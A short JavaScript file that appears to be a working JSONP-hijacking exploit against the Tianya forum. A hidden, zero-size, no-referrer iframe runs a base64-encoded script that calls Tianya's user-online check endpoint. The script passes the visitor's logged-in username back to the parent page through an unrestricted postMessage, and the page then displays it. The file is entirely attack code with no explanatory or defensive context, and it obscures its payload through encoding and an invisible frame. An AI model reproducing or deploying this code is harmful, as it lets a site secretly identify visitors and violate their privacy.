function t(d) {
  if ('tianya' === d.data.source) {
    console.log(d.data)
    var t = d.data.d
    if (t.code) {
      var a = { valid: !0, data: { username: t.username } }
      console.log(a)

      let innerHTML = `
      <div class='item'>
        <p class='title'>天涯网</p>
        <p>用户名: ${a.data.username}</p>
      </div>
    `
      let dom = document.createElement('div')
      dom.innerHTML = innerHTML
      document.getElementById('content').appendChild(dom)
    }
  }
}
function tianya() {
  var e = document.createElement('iframe')
  e.src =
    'data:text/html;base64,PHNjcmlwdD4KCXdpbmRvdy5jYWxsYmFjayA9IGZ1bmN0aW9uKGUsIHVzZXJuYW1lKSB7CmxldCBkID0ge3NvdXJjZTogJ3RpYW55YScsIGQ6IHtjb2RlOiBlLCB1c2VybmFtZTogdXNlcm5hbWV9fTt3aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKGQsICIqIik7fQoJbGV0IHMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKCXMuc3JjID0gImh0dHA6Ly9wYXNzcG9ydC50aWFueWEuY24vb25saW5lL2NoZWNrdXNlcm9ubGluZS5qc3A/dD0xNTg0NjE0MTg3MDI4JmNhbGxiYWNrPWNhbGxiYWNrIjsKCWRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5hcHBlbmRDaGlsZChzKTsKPC9zY3JpcHQ+'
  e.width = 0
  e.height = 0
  e.style.borderWidth = 0
  e.referrerPolicy = 'no-referrer'
  document.documentElement.appendChild(e)
}
window.addEventListener('message', t, !1)
// window.addEventListener('load', function () {
tianya()
// })
